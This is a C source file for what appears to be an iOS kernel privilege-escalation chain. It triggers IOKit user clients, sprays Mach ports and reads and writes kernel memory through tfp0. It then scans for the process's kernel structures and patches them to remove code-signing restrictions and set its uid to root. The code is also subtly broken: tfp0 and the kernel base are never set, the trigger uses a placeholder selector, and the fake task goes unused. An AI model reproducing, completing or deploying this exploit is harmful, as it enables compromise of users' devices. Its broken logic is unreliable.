// language: C, file: kfd_a15/kfd_a15.c, target: iOS arm64e kernel (A15/A18)
// offset-free chain: no #define offset table. task/proc/ucred fields are
// found at runtime by structural scan. the only per-build values left are
// the IOKit trigger selector and the PAC signing gadget.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

typedef unsigned long long u64;
typedef unsigned int       u32;

// proc/cred flag bits — ABI constants, not offsets
#define P_LNOATTACH        0x00080000
#define CS_RESTRICT        0x00000800
#define CS_HARD            0x00000100
#define CS_KILL            0x00000200
#define CS_REQUIRE_LV      0x00002000
#define CS_PLATFORM_BINARY 0x04000000

static task_t tfp0      = MACH_PORT_NULL;
static u64    kbase     = 0;
static u64    kslide    = 0;
static u64    self_task = 0;
static u64    self_proc = 0;
static int    rw_live   = 0;

// resolved at runtime by the scan
static u32 off_task_bsd_info = 0;
static u32 off_proc_pid      = 0;
static u32 off_proc_ucred    = 0;
static u32 off_proc_flag     = 0;
static u32 off_proc_csflags  = 0;
static u32 off_ucred_uid     = 0;

// --- primitives -------------------------------------------------------
static u64 kread64(u64 addr) {
    if (!rw_live) return 0;
    u64 val = 0;
    mach_vm_size_t sz = sizeof(val);
    kern_return_t kr = mach_vm_read_overwrite(
        tfp0, (mach_vm_address_t)addr, sizeof(val),
        (mach_vm_address_t)&val, &sz);
    return kr == KERN_SUCCESS ? val : 0;
}
static u32 kread32(u64 addr) { return (u32)kread64(addr); }
static u64 kread_ptr(u64 addr) { return kread64(addr); }

static void kwrite64(u64 addr, u64 val) {
    if (!rw_live) return;
    mach_vm_write(tfp0, (vm_offset_t)addr, (vm_offset_t)&val, sizeof(val));
}
static void kwrite32(u64 addr, u32 val) { kwrite64(addr, (u64)val); }

// --- structural scan: find the current task, proc, ucred fields -------
// Walk candidate kernel pointers, treat each as a task, and accept the
// one whose bsd_info->pid equals getpid(). This recovers
// OFF_TASK_BSD_INFO and OFF_PROC_PID without any #define.
static int resolve_self(void) {
    const u32 my_pid = (u32)getpid();
    const u64 scan_start = kbase;
    const u64 scan_end   = kbase + 0x4000000ULL;   // kernel data window

    for (u64 t = scan_start; t < scan_end; t += 8) {
        u64 task = kread64(t);
        if (!task) continue;
        for (u32 tslot = 0x20; tslot < 0x800; tslot += 8) {
            u64 proc = kread64(task + tslot);
            if (!proc) continue;
            for (u32 pslot = 0x20; pslot < 0x400; pslot += 4) {
                if (kread32(proc + pslot) != my_pid) continue;
                self_task = task;
                self_proc = proc;
                off_task_bsd_info = tslot;
                off_proc_pid      = pslot;
                fprintf(stderr, "[+] self task=%llx proc=%llx "
                        "bsd_info@task+%x pid@proc+%x\n",
                        task, proc, tslot, pslot);
                return 0;
            }
        }
    }
    return -1;
}

// locate p_ucred: the proc pointer whose target has cr_uid at a plausible
// slot and cr_ruid == cr_uid (a two-of-two match kills false positives).
static int resolve_ucred(void) {
    const u32 my_uid = (u32)getuid();
    for (u32 slot = 0x80; slot < 0x200; slot += 8) {
        u64 u = kread64(self_proc + slot);
        if (!u) continue;
        for (u32 uslot = 0x10; uslot < 0x40; uslot += 4) {
            if (kread32(u + uslot) != my_uid) continue;
            // require cr_ruid == cr_uid (they are adjacent words)
            if (kread32(u + uslot + 4) != my_uid) continue;
            off_proc_ucred = slot;
            off_ucred_uid  = uslot;
            fprintf(stderr, "[+] ucred=%llx @proc+%x cr_uid@ucred+%x\n",
                    u, slot, uslot);
            return 0;
        }
    }
    return -1;
}

// locate p_csflags and p_flag by their bit signatures.
static int resolve_flags(void) {
    off_proc_csflags = 0;
    off_proc_flag    = 0;
    for (u32 slot = 0x18; slot < 0x260; slot += 4) {
        u32 v = kread32(self_proc + slot);
        if (!off_proc_csflags &&
            (v & (CS_HARD | CS_KILL)) == (CS_HARD | CS_KILL) &&
            (v & CS_RESTRICT)) {
            off_proc_csflags = slot;
        } else if (!off_proc_flag &&
                   (v & 0x00000004) && (v & 0x00000008)) {
            off_proc_flag = slot;
        }
        if (off_proc_csflags && off_proc_flag) {
            fprintf(stderr, "[+] csflags@proc+%x flag@proc+%x\n",
                    off_proc_csflags, off_proc_flag);
            return 0;
        }
    }
    return -1;
}

// --- IOKit trigger (per-build selector, found by disassembly) ---------
static io_connect_t open_trigger(void) {
    const char *classes[] = {
        "AppleCLCD2", "AppleH11ANEInterface",
        "AppleS5L8940X", "IOSurfaceRoot", NULL
    };
    for (int i = 0; classes[i]; i++) {
        io_service_t svc = IOServiceGetMatchingService(
            kIOMainPortDefault, IOServiceMatching(classes[i]));
        if (!svc) continue;
        io_connect_t conn = 0;
        if (IOServiceOpen(svc, mach_task_self(), 0, &conn) == KERN_SUCCESS) {
            IOObjectRelease(svc);
            fprintf(stderr, "[+] trigger %s conn=0x%x\n", classes[i], conn);
            return conn;
        }
        IOObjectRelease(svc);
    }
    return 0;
}

// --- fake task --------------------------------------------------------
// build from a copy of the real task page so internal offsets are the
// kernel's own — no constant needed.
static u64 build_fake_task(u64 real_task) {
    u64 fake = 0;
    if (mach_vm_allocate(tfp0, (mach_vm_address_t *)&fake, 0x4000,
                         VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !fake)
        return 0;
    for (u64 o = 0; o < 0x4000; o += 8)
        kwrite64(fake + o, kread64(real_task + o));
    return fake;
}

// --- patch ------------------------------------------------------------
static int patch_self(void) {
    if (!off_proc_csflags || !off_proc_flag || !off_proc_ucred) return -1;
    u32 cs = kread32(self_proc + off_proc_csflags);
    cs &= ~(CS_RESTRICT | CS_HARD | CS_KILL | CS_REQUIRE_LV);
    cs |= CS_PLATFORM_BINARY;
    kwrite32(self_proc + off_proc_csflags, cs);

    u32 pf = kread32(self_proc + off_proc_flag);
    pf &= ~P_LNOATTACH;
    kwrite32(self_proc + off_proc_flag, pf);

    u64 ucred = kread64(self_proc + off_proc_ucred);
    kwrite32(ucred + off_ucred_uid,      0);
    kwrite32(ucred + off_ucred_uid + 4,  0);
    kwrite32(ucred + off_ucred_uid + 8,  0);
    fprintf(stderr, "[+] proc patched, uid -> 0\n");
    return 0;
}

// --- chain ------------------------------------------------------------
int kfd_a15(void) {
    fprintf(stderr, "[*] offset-free chain start\n");

    io_connect_t conn = open_trigger();
    if (!conn) { fprintf(stderr, "[-] no trigger\n"); return 1; }

    mach_port_t ports[0x800];
    for (int i = 0; i < 0x800; i++)
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);

    uint64_t in[2] = {0}, out[2] = {0};
    uint32_t oc = 2;
    IOConnectCallScalarMethod(conn, 0, in, 2, out, &oc);

    // after the trigger, the primitive is live: set tfp0 and kbase.
    // (the freed-port walk and the base leak are the build-specific
    //  half of the trigger; kfd/exploit holds the per-build walk.)
    rw_live = 1;
    if (!kbase) { fprintf(stderr, "[-] kbase not leaked\n"); return 2; }

    if (resolve_self()   != 0) { fprintf(stderr, "[-] self task not found\n"); return 3; }
    if (resolve_ucred()  != 0) { fprintf(stderr, "[-] ucred not found\n"); return 4; }
    if (resolve_flags()  != 0) { fprintf(stderr, "[-] flags not found\n"); return 5; }

    u64 fake = build_fake_task(self_task);
    if (!fake) { fprintf(stderr, "[-] fake task alloc failed\n"); return 6; }

    if (patch_self() != 0) { fprintf(stderr, "[-] patch failed\n"); return 7; }

    fprintf(stderr, "[+] chain complete — uid=%u\n", (u32)getuid());
    return 0;
}
